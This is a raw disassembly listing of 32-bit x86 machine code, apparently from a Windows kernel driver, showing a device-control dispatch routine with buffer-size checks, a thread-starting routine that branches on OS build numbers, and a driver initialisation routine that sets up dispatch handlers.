  4040db:	75 0b                	jne    0x4040e8
  4040dd:	33 c0                	xor    %eax,%eax
  4040df:	5f                   	pop    %edi
  4040e0:	5e                   	pop    %esi
  4040e1:	5b                   	pop    %ebx
  4040e2:	8b e5                	mov    %ebp,%esp
  4040e4:	5d                   	pop    %ebp
  4040e5:	c2 08 00             	ret    $0x8
  4040e8:	8b 7d 08             	mov    0x8(%ebp),%edi
  4040eb:	8b 46 60             	mov    0x60(%esi),%eax
  4040ee:	3b 3d cc 9f 40 00    	cmp    0x409fcc,%edi
  4040f4:	74 10                	je     0x404106
  4040f6:	3b 3d d0 9f 40 00    	cmp    0x409fd0,%edi
  4040fc:	74 08                	je     0x404106
  4040fe:	3b 3d d4 9f 40 00    	cmp    0x409fd4,%edi
  404104:	75 10                	jne    0x404116
  404106:	8b c6                	mov    %esi,%eax
  404108:	e8 63 17 00 00       	call   0x405870
  40410d:	5f                   	pop    %edi
  40410e:	5e                   	pop    %esi
  40410f:	5b                   	pop    %ebx
  404110:	8b e5                	mov    %ebp,%esp
  404112:	5d                   	pop    %ebp
  404113:	c2 08 00             	ret    $0x8
  404116:	3b 3d 14 8b 40 00    	cmp    0x408b14,%edi
  40411c:	0f 85 58 02 00 00    	jne    0x40437a
  404122:	80 38 0e             	cmpb   $0xe,(%eax)
  404125:	0f 85 4f 02 00 00    	jne    0x40437a
  40412b:	8b 48 04             	mov    0x4(%eax),%ecx
  40412e:	8b 58 08             	mov    0x8(%eax),%ebx
  404131:	8b 40 0c             	mov    0xc(%eax),%eax
  404134:	8b 7e 0c             	mov    0xc(%esi),%edi
  404137:	05 d8 df dd ff       	add    $0xffdddfd8,%eax
  40413c:	89 4c 24 0c          	mov    %ecx,0xc(%esp)
  404140:	83 f8 20             	cmp    $0x20,%eax
  404143:	77 29                	ja     0x40416e
  404145:	0f b6 90 c0 43 40 00 	movzbl 0x4043c0(%eax),%edx
  40414c:	ff 24 95 98 43 40 00 	jmp    *0x404398(,%edx,4)
  404153:	57                   	push   %edi
  404154:	ff 15 80 60 40 00    	call   *0x406080
  40415a:	84 c0                	test   %al,%al
  40415c:	74 10                	je     0x40416e
  40415e:	83 fb 04             	cmp    $0x4,%ebx
  404161:	75 0b                	jne    0x40416e
  404163:	8b 1f                	mov    (%edi),%ebx
  404165:	e8 36 f4 ff ff       	call   0x4035a0
  40416a:	8b d8                	mov    %eax,%ebx
  40416c:	eb 62                	jmp    0x4041d0
  40416e:	bb 0d 00 00 c0       	mov    $0xc000000d,%ebx
  404173:	c7 46 1c 00 00 00 00 	movl   $0x0,0x1c(%esi)
  40417a:	89 5e 18             	mov    %ebx,0x18(%esi)
  40417d:	e9 fe 01 00 00       	jmp    0x404380
  404182:	57                   	push   %edi
  404183:	ff 15 80 60 40 00    	call   *0x406080
  404189:	84 c0                	test   %al,%al
  40418b:	74 e1                	je     0x40416e
  40418d:	83 fb 04             	cmp    $0x4,%ebx
  404190:	75 dc                	jne    0x40416e
  404192:	81 7c 24 0c 10 03 00 	cmpl   $0x310,0xc(%esp)
  404199:	00 
  40419a:	75 d2                	jne    0x40416e
  40419c:	68 10 03 00 00       	push   $0x310
  4041a1:	8d 44 24 14          	lea    0x14(%esp),%eax
  4041a5:	6a 00                	push   $0x0
  4041a7:	50                   	push   %eax
  4041a8:	e8 cf 18 00 00       	call   0x405a7c
  4041ad:	8b 1f                	mov    (%edi),%ebx
  4041af:	83 c4 0c             	add    $0xc,%esp
  4041b2:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  4041b6:	51                   	push   %ecx
  4041b7:	e8 74 f4 ff ff       	call   0x403630
  4041bc:	8b d8                	mov    %eax,%ebx
  4041be:	85 db                	test   %ebx,%ebx
  4041c0:	7c b1                	jl     0x404173
  4041c2:	b9 c4 00 00 00       	mov    $0xc4,%ecx
  4041c7:	8d 74 24 10          	lea    0x10(%esp),%esi
  4041cb:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4041cd:	8b 75 0c             	mov    0xc(%ebp),%esi
  4041d0:	85 db                	test   %ebx,%ebx
  4041d2:	75 9f                	jne    0x404173
  4041d4:	8b 54 24 0c          	mov    0xc(%esp),%edx
  4041d8:	89 56 1c             	mov    %edx,0x1c(%esi)
  4041db:	89 5e 18             	mov    %ebx,0x18(%esi)
  4041de:	e9 9d 01 00 00       	jmp    0x404380
  4041e3:	57                   	push   %edi
  4041e4:	ff 15 80 60 40 00    	call   *0x406080
  4041ea:	84 c0                	test   %al,%al
  4041ec:	74 80                	je     0x40416e
  4041ee:	81 fb 10 03 00 00    	cmp    $0x310,%ebx
  4041f4:	0f 85 74 ff ff ff    	jne    0x40416e
  4041fa:	8b f7                	mov    %edi,%esi
  4041fc:	b9 c4 00 00 00       	mov    $0xc4,%ecx
  404201:	8d 7c 24 10          	lea    0x10(%esp),%edi
  404205:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  404207:	8d 7c 24 10          	lea    0x10(%esp),%edi
  40420b:	e8 90 f4 ff ff       	call   0x4036a0
  404210:	8b d8                	mov    %eax,%ebx
  404212:	eb b9                	jmp    0x4041cd
  404214:	57                   	push   %edi
  404215:	ff 15 80 60 40 00    	call   *0x406080
  40421b:	84 c0                	test   %al,%al
  40421d:	0f 84 4b ff ff ff    	je     0x40416e
  404223:	83 fb 04             	cmp    $0x4,%ebx
  404226:	0f 85 42 ff ff ff    	jne    0x40416e
  40422c:	81 7c 24 0c 10 03 00 	cmpl   $0x310,0xc(%esp)
  404233:	00 
  404234:	0f 85 34 ff ff ff    	jne    0x40416e
  40423a:	68 10 03 00 00       	push   $0x310
  40423f:	8d 54 24 14          	lea    0x14(%esp),%edx
  404243:	6a 00                	push   $0x0
  404245:	52                   	push   %edx
  404246:	e8 31 18 00 00       	call   0x405a7c
  40424b:	8b 1f                	mov    (%edi),%ebx
  40424d:	83 c4 0c             	add    $0xc,%esp
  404250:	8d 44 24 10          	lea    0x10(%esp),%eax
  404254:	50                   	push   %eax
  404255:	e8 c6 f4 ff ff       	call   0x403720
  40425a:	e9 5d ff ff ff       	jmp    0x4041bc
  40425f:	57                   	push   %edi
  404260:	ff 15 80 60 40 00    	call   *0x406080
  404266:	84 c0                	test   %al,%al
  404268:	0f 84 00 ff ff ff    	je     0x40416e
  40426e:	81 fb 10 03 00 00    	cmp    $0x310,%ebx
  404274:	0f 85 f4 fe ff ff    	jne    0x40416e
  40427a:	8b f7                	mov    %edi,%esi
  40427c:	b9 c4 00 00 00       	mov    $0xc4,%ecx
  404281:	8d 7c 24 10          	lea    0x10(%esp),%edi
  404285:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  404287:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  40428b:	51                   	push   %ecx
  40428c:	e8 6f f5 ff ff       	call   0x403800
  404291:	8b d8                	mov    %eax,%ebx
  404293:	e9 35 ff ff ff       	jmp    0x4041cd
  404298:	57                   	push   %edi
  404299:	ff 15 80 60 40 00    	call   *0x406080
  40429f:	84 c0                	test   %al,%al
  4042a1:	0f 84 c7 fe ff ff    	je     0x40416e
  4042a7:	83 fb 04             	cmp    $0x4,%ebx
  4042aa:	0f 85 be fe ff ff    	jne    0x40416e
  4042b0:	81 7c 24 0c 10 03 00 	cmpl   $0x310,0xc(%esp)
  4042b7:	00 
  4042b8:	0f 85 b0 fe ff ff    	jne    0x40416e
  4042be:	68 10 03 00 00       	push   $0x310
  4042c3:	8d 54 24 14          	lea    0x14(%esp),%edx
  4042c7:	6a 00                	push   $0x0
  4042c9:	52                   	push   %edx
  4042ca:	e8 ad 17 00 00       	call   0x405a7c
  4042cf:	8b 07                	mov    (%edi),%eax
  4042d1:	83 c4 0c             	add    $0xc,%esp
  4042d4:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  4042d8:	51                   	push   %ecx
  4042d9:	50                   	push   %eax
  4042da:	e8 11 f6 ff ff       	call   0x4038f0
  4042df:	e9 d8 fe ff ff       	jmp    0x4041bc
  4042e4:	57                   	push   %edi
  4042e5:	ff 15 80 60 40 00    	call   *0x406080
  4042eb:	84 c0                	test   %al,%al
  4042ed:	0f 84 7b fe ff ff    	je     0x40416e
  4042f3:	81 fb 10 03 00 00    	cmp    $0x310,%ebx
  4042f9:	0f 85 6f fe ff ff    	jne    0x40416e
  4042ff:	8b f7                	mov    %edi,%esi
  404301:	8d 54 24 10          	lea    0x10(%esp),%edx
  404305:	b9 c4 00 00 00       	mov    $0xc4,%ecx
  40430a:	8d 7c 24 10          	lea    0x10(%esp),%edi
  40430e:	52                   	push   %edx
  40430f:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  404311:	e8 ea f7 ff ff       	call   0x403b00
  404316:	8b d8                	mov    %eax,%ebx
  404318:	e9 b0 fe ff ff       	jmp    0x4041cd
  40431d:	57                   	push   %edi
  40431e:	ff 15 80 60 40 00    	call   *0x406080
  404324:	84 c0                	test   %al,%al
  404326:	0f 84 42 fe ff ff    	je     0x40416e
  40432c:	83 7c 24 0c 04       	cmpl   $0x4,0xc(%esp)
  404331:	0f 85 37 fe ff ff    	jne    0x40416e
  404337:	a1 00 70 40 00       	mov    0x407000,%eax
  40433c:	8b 54 24 0c          	mov    0xc(%esp),%edx
  404340:	89 07                	mov    %eax,(%edi)
  404342:	33 db                	xor    %ebx,%ebx
  404344:	89 56 1c             	mov    %edx,0x1c(%esi)
  404347:	89 5e 18             	mov    %ebx,0x18(%esi)
  40434a:	eb 34                	jmp    0x404380
  40434c:	57                   	push   %edi
  40434d:	ff 15 80 60 40 00    	call   *0x406080
  404353:	84 c0                	test   %al,%al
  404355:	0f 84 13 fe ff ff    	je     0x40416e
  40435b:	83 fb 04             	cmp    $0x4,%ebx
  40435e:	0f 85 0a fe ff ff    	jne    0x40416e
  404364:	8b 0f                	mov    (%edi),%ecx
  404366:	8b 54 24 0c          	mov    0xc(%esp),%edx
  40436a:	33 db                	xor    %ebx,%ebx
  40436c:	89 0d 00 70 40 00    	mov    %ecx,0x407000
  404372:	89 56 1c             	mov    %edx,0x1c(%esi)
  404375:	89 5e 18             	mov    %ebx,0x18(%esi)
  404378:	eb 06                	jmp    0x404380
  40437a:	89 4e 18             	mov    %ecx,0x18(%esi)
  40437d:	89 4e 1c             	mov    %ecx,0x1c(%esi)
  404380:	32 d2                	xor    %dl,%dl
  404382:	8b ce                	mov    %esi,%ecx
  404384:	ff 15 dc 60 40 00    	call   *0x4060dc
  40438a:	5f                   	pop    %edi
  40438b:	5e                   	pop    %esi
  40438c:	8b c3                	mov    %ebx,%eax
  40438e:	5b                   	pop    %ebx
  40438f:	8b e5                	mov    %ebp,%esp
  404391:	5d                   	pop    %ebp
  404392:	c2 08 00             	ret    $0x8
  404395:	8d 49 00             	lea    0x0(%ecx),%ecx
  404398:	53                   	push   %ebx
  404399:	41                   	inc    %ecx
  40439a:	40                   	inc    %eax
  40439b:	00 82 41 40 00 e3    	add    %al,-0x1cffbfbf(%edx)
  4043a1:	41                   	inc    %ecx
  4043a2:	40                   	inc    %eax
  4043a3:	00 14 42             	add    %dl,(%edx,%eax,2)
  4043a6:	40                   	inc    %eax
  4043a7:	00 5f 42             	add    %bl,0x42(%edi)
  4043aa:	40                   	inc    %eax
  4043ab:	00 98 42 40 00 e4    	add    %bl,-0x1bffbfbe(%eax)
  4043b1:	42                   	inc    %edx
  4043b2:	40                   	inc    %eax
  4043b3:	00 1d 43 40 00 4c    	add    %bl,0x4c004043
  4043b9:	43                   	inc    %ebx
  4043ba:	40                   	inc    %eax
  4043bb:	00 6e 41             	add    %ch,0x41(%esi)
  4043be:	40                   	inc    %eax
  4043bf:	00 00                	add    %al,(%eax)
  4043c1:	09 09                	or     %ecx,(%ecx)
  4043c3:	09 01                	or     %eax,(%ecx)
  4043c5:	09 09                	or     %ecx,(%ecx)
  4043c7:	09 02                	or     %eax,(%edx)
  4043c9:	09 09                	or     %ecx,(%ecx)
  4043cb:	09 03                	or     %eax,(%ebx)
  4043cd:	09 09                	or     %ecx,(%ecx)
  4043cf:	09 04 09             	or     %eax,(%ecx,%ecx,1)
  4043d2:	09 09                	or     %ecx,(%ecx)
  4043d4:	05 09 09 09 06       	add    $0x6090909,%eax
  4043d9:	09 09                	or     %ecx,(%ecx)
  4043db:	09 07                	or     %eax,(%edi)
  4043dd:	09 09                	or     %ecx,(%ecx)
  4043df:	09 08                	or     %ecx,(%eax)
  4043e1:	cc                   	int3
  4043e2:	cc                   	int3
  4043e3:	cc                   	int3
  4043e4:	cc                   	int3
  4043e5:	cc                   	int3
  4043e6:	cc                   	int3
  4043e7:	cc                   	int3
  4043e8:	cc                   	int3
  4043e9:	cc                   	int3
  4043ea:	cc                   	int3
  4043eb:	cc                   	int3
  4043ec:	cc                   	int3
  4043ed:	cc                   	int3
  4043ee:	cc                   	int3
  4043ef:	cc                   	int3
  4043f0:	55                   	push   %ebp
  4043f1:	8b ec                	mov    %esp,%ebp
  4043f3:	83 e4 f8             	and    $0xfffffff8,%esp
  4043f6:	81 ec 24 03 00 00    	sub    $0x324,%esp
  4043fc:	53                   	push   %ebx
  4043fd:	56                   	push   %esi
  4043fe:	8b 35 a0 60 40 00    	mov    0x4060a0,%esi
  404404:	57                   	push   %edi
  404405:	8b 3d 28 61 40 00    	mov    0x406128,%edi
  40440b:	c7 44 24 10 80 69 67 	movl   $0xff676980,0x10(%esp)
  404412:	ff 
  404413:	c7 44 24 14 ff ff ff 	movl   $0xffffffff,0x14(%esp)
  40441a:	ff 
  40441b:	bb 04 00 00 00       	mov    $0x4,%ebx
  404420:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  404424:	50                   	push   %eax
  404425:	8d 4c 24 1c          	lea    0x1c(%esp),%ecx
  404429:	51                   	push   %ecx
  40442a:	68 78 65 40 00       	push   $0x406578
  40442f:	e8 0c 0f 00 00       	call   0x405340
  404434:	85 c0                	test   %eax,%eax
  404436:	7d 0d                	jge    0x404445
  404438:	8d 54 24 10          	lea    0x10(%esp),%edx
  40443c:	52                   	push   %edx
  40443d:	6a 00                	push   $0x0
  40443f:	6a 00                	push   $0x0
  404441:	ff d6                	call   *%esi
  404443:	eb db                	jmp    0x404420
  404445:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  404449:	39 59 04             	cmp    %ebx,0x4(%ecx)
  40444c:	75 05                	jne    0x404453
  40444e:	39 59 08             	cmp    %ebx,0x8(%ecx)
  404451:	74 15                	je     0x404468
  404453:	68 44 52 56 31       	push   $0x31565244
  404458:	51                   	push   %ecx
  404459:	ff d7                	call   *%edi
  40445b:	8d 44 24 10          	lea    0x10(%esp),%eax
  40445f:	50                   	push   %eax
  404460:	6a 00                	push   $0x0
  404462:	6a 00                	push   $0x0
  404464:	ff d6                	call   *%esi
  404466:	eb b8                	jmp    0x404420
  404468:	8b 41 0c             	mov    0xc(%ecx),%eax
  40446b:	8b d8                	mov    %eax,%ebx
  40446d:	68 44 52 56 31       	push   $0x31565244
  404472:	25 00 00 00 f0       	and    $0xf0000000,%eax
  404477:	51                   	push   %ecx
  404478:	81 e3 ff ff ff 0f    	and    $0xfffffff,%ebx
  40447e:	8b f0                	mov    %eax,%esi
  404480:	ff d7                	call   *%edi
  404482:	85 f6                	test   %esi,%esi
  404484:	0f 85 b7 00 00 00    	jne    0x404541
  40448a:	68 10 03 00 00       	push   $0x310
  40448f:	8d 4c 24 24          	lea    0x24(%esp),%ecx
  404493:	56                   	push   %esi
  404494:	51                   	push   %ecx
  404495:	e8 e2 15 00 00       	call   0x405a7c
  40449a:	8b 15 c8 65 40 00    	mov    0x4065c8,%edx
  4044a0:	a1 cc 65 40 00       	mov    0x4065cc,%eax
  4044a5:	8b 0d d0 65 40 00    	mov    0x4065d0,%ecx
  4044ab:	83 c4 0c             	add    $0xc,%esp
  4044ae:	8d 7c 24 20          	lea    0x20(%esp),%edi
  4044b2:	89 5c 24 20          	mov    %ebx,0x20(%esp)
  4044b6:	89 54 24 24          	mov    %edx,0x24(%esp)
  4044ba:	89 44 24 28          	mov    %eax,0x28(%esp)
  4044be:	89 4c 24 2c          	mov    %ecx,0x2c(%esp)
  4044c2:	e8 d9 f1 ff ff       	call   0x4036a0
  4044c7:	68 10 03 00 00       	push   $0x310
  4044cc:	8b d7                	mov    %edi,%edx
  4044ce:	56                   	push   %esi
  4044cf:	52                   	push   %edx
  4044d0:	e8 a7 15 00 00       	call   0x405a7c
  4044d5:	83 c4 0c             	add    $0xc,%esp
  4044d8:	89 5c 24 20          	mov    %ebx,0x20(%esp)
  4044dc:	33 c0                	xor    %eax,%eax
  4044de:	8b ff                	mov    %edi,%edi
  4044e0:	0f b7 88 d4 65 40 00 	movzwl 0x4065d4(%eax),%ecx
  4044e7:	66 89 8c 04 28 01 00 	mov    %cx,0x128(%esp,%eax,1)
  4044ee:	00 
  4044ef:	83 c0 02             	add    $0x2,%eax
  4044f2:	66 85 c9             	test   %cx,%cx
  4044f5:	75 e9                	jne    0x4044e0
  4044f7:	8d 44 24 20          	lea    0x20(%esp),%eax
  4044fb:	50                   	push   %eax
  4044fc:	e8 ff f2 ff ff       	call   0x403800
  404501:	68 10 03 00 00       	push   $0x310
  404506:	8d 4c 24 24          	lea    0x24(%esp),%ecx
  40450a:	6a 00                	push   $0x0
  40450c:	51                   	push   %ecx
  40450d:	e8 6a 15 00 00       	call   0x405a7c
  404512:	83 c4 0c             	add    $0xc,%esp
  404515:	89 5c 24 20          	mov    %ebx,0x20(%esp)
  404519:	33 c0                	xor    %eax,%eax
  40451b:	eb 03                	jmp    0x404520
  40451d:	8d 49 00             	lea    0x0(%ecx),%ecx
  404520:	0f b7 88 f0 65 40 00 	movzwl 0x4065f0(%eax),%ecx
  404527:	66 89 8c 04 28 01 00 	mov    %cx,0x128(%esp,%eax,1)
  40452e:	00 
  40452f:	83 c0 02             	add    $0x2,%eax
  404532:	66 85 c9             	test   %cx,%cx
  404535:	75 e9                	jne    0x404520
  404537:	8d 54 24 20          	lea    0x20(%esp),%edx
  40453b:	52                   	push   %edx
  40453c:	e9 cb 00 00 00       	jmp    0x40460c
  404541:	81 fe 00 00 00 10    	cmp    $0x10000000,%esi
  404547:	0f 85 c4 00 00 00    	jne    0x404611
  40454d:	68 10 03 00 00       	push   $0x310
  404552:	8d 44 24 24          	lea    0x24(%esp),%eax
  404556:	6a 00                	push   $0x0
  404558:	50                   	push   %eax
  404559:	e8 1e 15 00 00       	call   0x405a7c
  40455e:	8b 0d 2c 66 40 00    	mov    0x40662c,%ecx
  404564:	8b 15 30 66 40 00    	mov    0x406630,%edx
  40456a:	a1 34 66 40 00       	mov    0x406634,%eax
  40456f:	83 c4 0c             	add    $0xc,%esp
  404572:	8d 7c 24 20          	lea    0x20(%esp),%edi
  404576:	89 5c 24 20          	mov    %ebx,0x20(%esp)
  40457a:	89 4c 24 24          	mov    %ecx,0x24(%esp)
  40457e:	89 54 24 28          	mov    %edx,0x28(%esp)
  404582:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  404586:	e8 15 f1 ff ff       	call   0x4036a0
  40458b:	68 10 03 00 00       	push   $0x310
  404590:	8b cf                	mov    %edi,%ecx
  404592:	6a 00                	push   $0x0
  404594:	51                   	push   %ecx
  404595:	e8 e2 14 00 00       	call   0x405a7c
  40459a:	83 c4 0c             	add    $0xc,%esp
  40459d:	89 5c 24 20          	mov    %ebx,0x20(%esp)
  4045a1:	33 c0                	xor    %eax,%eax
  4045a3:	eb 0b                	jmp    0x4045b0
  4045a5:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  4045ac:	8d 64 24 00          	lea    0x0(%esp),%esp
  4045b0:	0f b7 88 38 66 40 00 	movzwl 0x406638(%eax),%ecx
  4045b7:	66 89 8c 04 28 01 00 	mov    %cx,0x128(%esp,%eax,1)
  4045be:	00 
  4045bf:	83 c0 02             	add    $0x2,%eax
  4045c2:	66 85 c9             	test   %cx,%cx
  4045c5:	75 e9                	jne    0x4045b0
  4045c7:	8d 54 24 20          	lea    0x20(%esp),%edx
  4045cb:	52                   	push   %edx
  4045cc:	e8 2f f2 ff ff       	call   0x403800
  4045d1:	68 10 03 00 00       	push   $0x310
  4045d6:	8d 44 24 24          	lea    0x24(%esp),%eax
  4045da:	6a 00                	push   $0x0
  4045dc:	50                   	push   %eax
  4045dd:	e8 9a 14 00 00       	call   0x405a7c
  4045e2:	83 c4 0c             	add    $0xc,%esp
  4045e5:	89 5c 24 20          	mov    %ebx,0x20(%esp)
  4045e9:	33 c0                	xor    %eax,%eax
  4045eb:	eb 03                	jmp    0x4045f0
  4045ed:	8d 49 00             	lea    0x0(%ecx),%ecx
  4045f0:	0f b7 88 54 66 40 00 	movzwl 0x406654(%eax),%ecx
  4045f7:	66 89 8c 04 28 01 00 	mov    %cx,0x128(%esp,%eax,1)
  4045fe:	00 
  4045ff:	83 c0 02             	add    $0x2,%eax
  404602:	66 85 c9             	test   %cx,%cx
  404605:	75 e9                	jne    0x4045f0
  404607:	8d 4c 24 20          	lea    0x20(%esp),%ecx
  40460b:	51                   	push   %ecx
  40460c:	e8 ef f4 ff ff       	call   0x403b00
  404611:	e8 8a ef ff ff       	call   0x4035a0
  404616:	6a 00                	push   $0x0
  404618:	ff 15 0c 60 40 00    	call   *0x40600c
  40461e:	5f                   	pop    %edi
  40461f:	5e                   	pop    %esi
  404620:	5b                   	pop    %ebx
  404621:	8b e5                	mov    %ebp,%esp
  404623:	5d                   	pop    %ebp
  404624:	c2 04 00             	ret    $0x4
  404627:	cc                   	int3
  404628:	cc                   	int3
  404629:	cc                   	int3
  40462a:	cc                   	int3
  40462b:	cc                   	int3
  40462c:	cc                   	int3
  40462d:	cc                   	int3
  40462e:	cc                   	int3
  40462f:	cc                   	int3
  404630:	55                   	push   %ebp
  404631:	8b ec                	mov    %esp,%ebp
  404633:	83 e4 f8             	and    $0xfffffff8,%esp
  404636:	83 ec 1c             	sub    $0x1c,%esp
  404639:	53                   	push   %ebx
  40463a:	56                   	push   %esi
  40463b:	57                   	push   %edi
  40463c:	6a 00                	push   $0x0
  40463e:	68 60 10 40 00       	push   $0x401060
  404643:	6a 00                	push   $0x0
  404645:	6a 00                	push   $0x0
  404647:	6a 00                	push   $0x0
  404649:	6a 00                	push   $0x0
  40464b:	8d 44 24 24          	lea    0x24(%esp),%eax
  40464f:	50                   	push   %eax
  404650:	ff 15 08 60 40 00    	call   *0x406008
  404656:	85 c0                	test   %eax,%eax
  404658:	7c 0b                	jl     0x404665
  40465a:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  40465e:	51                   	push   %ecx
  40465f:	ff 15 14 60 40 00    	call   *0x406014
  404665:	8b 3d 18 60 40 00    	mov    0x406018,%edi
  40466b:	68 90 66 40 00       	push   $0x406690
  404670:	8d 54 24 1c          	lea    0x1c(%esp),%edx
  404674:	52                   	push   %edx
  404675:	ff d7                	call   *%edi
  404677:	8b 75 08             	mov    0x8(%ebp),%esi
  40467a:	b8 c0 40 40 00       	mov    $0x4040c0,%eax
  40467f:	89 46 38             	mov    %eax,0x38(%esi)
  404682:	89 46 3c             	mov    %eax,0x3c(%esi)
  404685:	89 46 40             	mov    %eax,0x40(%esi)
  404688:	89 46 44             	mov    %eax,0x44(%esi)
  40468b:	89 46 48             	mov    %eax,0x48(%esi)
  40468e:	89 46 4c             	mov    %eax,0x4c(%esi)
  404691:	89 46 50             	mov    %eax,0x50(%esi)
  404694:	89 46 54             	mov    %eax,0x54(%esi)
  404697:	89 46 58             	mov    %eax,0x58(%esi)
  40469a:	89 46 5c             	mov    %eax,0x5c(%esi)
  40469d:	89 46 60             	mov    %eax,0x60(%esi)
  4046a0:	89 46 64             	mov    %eax,0x64(%esi)
  4046a3:	89 46 68             	mov    %eax,0x68(%esi)
  4046a6:	89 46 6c             	mov    %eax,0x6c(%esi)
  4046a9:	89 46 74             	mov    %eax,0x74(%esi)
  4046ac:	89 46 78             	mov    %eax,0x78(%esi)
  4046af:	89 46 7c             	mov    %eax,0x7c(%esi)
  4046b2:	89 86 80 00 00 00    	mov    %eax,0x80(%esi)
  4046b8:	89 86 84 00 00 00    	mov    %eax,0x84(%esi)
  4046be:	89 86 88 00 00 00    	mov    %eax,0x88(%esi)
  4046c4:	89 86 8c 00 00 00    	mov    %eax,0x8c(%esi)
  4046ca:	89 86 90 00 00 00    	mov    %eax,0x90(%esi)
  4046d0:	89 86 94 00 00 00    	mov    %eax,0x94(%esi)
  4046d6:	68 14 8b 40 00       	push   $0x408b14
  4046db:	89 86 98 00 00 00    	mov    %eax,0x98(%esi)
  4046e1:	89 86 9c 00 00 00    	mov    %eax,0x9c(%esi)
  4046e7:	6a 00                	push   $0x0
  4046e9:	89 86 a0 00 00 00    	mov    %eax,0xa0(%esi)
  4046ef:	6a 00                	push   $0x0
  4046f1:	89 86 a4 00 00 00    	mov    %eax,0xa4(%esi)
  4046f7:	6a 22                	push   $0x22
  4046f9:	89 46 70             	mov    %eax,0x70(%esi)
  4046fc:	8d 44 24 28          	lea    0x28(%esp),%eax
  404700:	50                   	push   %eax
  404701:	6a 00                	push   $0x0
  404703:	56                   	push   %esi
  404704:	c7 46 34 40 40 40 00 	movl   $0x404040,0x34(%esi)
  40470b:	ff 15 f4 60 40 00    	call   *0x4060f4
  404711:	85 c0                	test   %eax,%eax
  404713:	0f 8c b5 01 00 00    	jl     0x4048ce
  404719:	a1 14 8b 40 00       	mov    0x408b14,%eax
  40471e:	85 c0                	test   %eax,%eax
  404720:	75 0e                	jne    0x404730
  404722:	b8 e9 00 00 c0       	mov    $0xc00000e9,%eax
  404727:	5f                   	pop    %edi
  404728:	5e                   	pop    %esi
  404729:	5b                   	pop    %ebx
  40472a:	8b e5                	mov    %ebp,%esp
  40472c:	5d                   	pop    %ebp
  40472d:	c2 08 00             	ret    $0x8
  404730:	83 48 1c 10          	orl    $0x10,0x1c(%eax)
  404734:	8b 0d 14 8b 40 00    	mov    0x408b14,%ecx
  40473a:	6a 10                	push   $0x10
  40473c:	6a 01                	push   $0x1
  40473e:	c7 41 5c 01 00 00 00 	movl   $0x1,0x5c(%ecx)
  404745:	ff 15 ec 60 40 00    	call   *0x4060ec
  40474b:	84 c0                	test   %al,%al
  40474d:	74 0c                	je     0x40475b
  40474f:	68 f8 66 40 00       	push   $0x4066f8
  404754:	8d 54 24 24          	lea    0x24(%esp),%edx
  404758:	52                   	push   %edx
  404759:	eb 0a                	jmp    0x404765
  40475b:	68 10 65 40 00       	push   $0x406510
  404760:	8d 44 24 24          	lea    0x24(%esp),%eax
  404764:	50                   	push   %eax
  404765:	ff d7                	call   *%edi
  404767:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  40476b:	51                   	push   %ecx
  40476c:	8d 54 24 24          	lea    0x24(%esp),%edx
  404770:	52                   	push   %edx
  404771:	ff 15 f0 60 40 00    	call   *0x4060f0
  404777:	a1 14 8b 40 00       	mov    0x408b14,%eax
  40477c:	81 60 1c 7f ff ff ff 	andl   $0xffffff7f,0x1c(%eax)
  404783:	8b 45 0c             	mov    0xc(%ebp),%eax
  404786:	50                   	push   %eax
  404787:	56                   	push   %esi
  404788:	e8 23 dd ff ff       	call   0x4024b0
  40478d:	68 68 67 40 00       	push   $0x406768
  404792:	b9 bc 67 40 00       	mov    $0x4067bc,%ecx
  404797:	8b c6                	mov    %esi,%eax
  404799:	e8 62 ca ff ff       	call   0x401200
  40479e:	68 d8 67 40 00       	push   $0x4067d8
  4047a3:	b9 2c 68 40 00       	mov    $0x40682c,%ecx
  4047a8:	8b c6                	mov    %esi,%eax
  4047aa:	e8 51 ca ff ff       	call   0x401200
  4047af:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  4047b3:	51                   	push   %ecx
  4047b4:	8d 5c 24 18          	lea    0x18(%esp),%ebx
  4047b8:	8d 7c 24 10          	lea    0x10(%esp),%edi
  4047bc:	e8 af 11 00 00       	call   0x405970
  4047c1:	85 c0                	test   %eax,%eax
  4047c3:	0f 8c 03 01 00 00    	jl     0x4048cc
  4047c9:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  4047cd:	81 ff 28 0a 00 00    	cmp    $0xa28,%edi
  4047d3:	75 3f                	jne    0x404814
  4047d5:	6a 00                	push   $0x0
  4047d7:	68 30 2b 40 00       	push   $0x402b30
  4047dc:	6a 00                	push   $0x0
  4047de:	6a 00                	push   $0x0
  4047e0:	6a 00                	push   $0x0
  4047e2:	6a 00                	push   $0x0
  4047e4:	8d 54 24 24          	lea    0x24(%esp),%edx
  4047e8:	52                   	push   %edx
  4047e9:	ff 15 08 60 40 00    	call   *0x406008
  4047ef:	85 c0                	test   %eax,%eax
  4047f1:	7c 0b                	jl     0x4047fe
  4047f3:	8b 44 24 0c          	mov    0xc(%esp),%eax
  4047f7:	50                   	push   %eax
  4047f8:	ff 15 14 60 40 00    	call   *0x406014
  4047fe:	68 48 68 40 00       	push   $0x406848
  404803:	b9 98 68 40 00       	mov    $0x406898,%ecx
  404808:	8b c6                	mov    %esi,%eax
  40480a:	e8 f1 c9 ff ff       	call   0x401200
  40480f:	e9 8f 00 00 00       	jmp    0x4048a3
  404814:	81 ff 70 17 00 00    	cmp    $0x1770,%edi
  40481a:	72 3a                	jb     0x404856
  40481c:	6a 00                	push   $0x0
  40481e:	68 00 30 40 00       	push   $0x403000
  404823:	6a 00                	push   $0x0
  404825:	6a 00                	push   $0x0
  404827:	6a 00                	push   $0x0
  404829:	6a 00                	push   $0x0
  40482b:	8d 4c 24 24          	lea    0x24(%esp),%ecx
  40482f:	51                   	push   %ecx
  404830:	ff 15 08 60 40 00    	call   *0x406008
  404836:	85 c0                	test   %eax,%eax
  404838:	7c 0b                	jl     0x404845
  40483a:	8b 54 24 0c          	mov    0xc(%esp),%edx
  40483e:	52                   	push   %edx
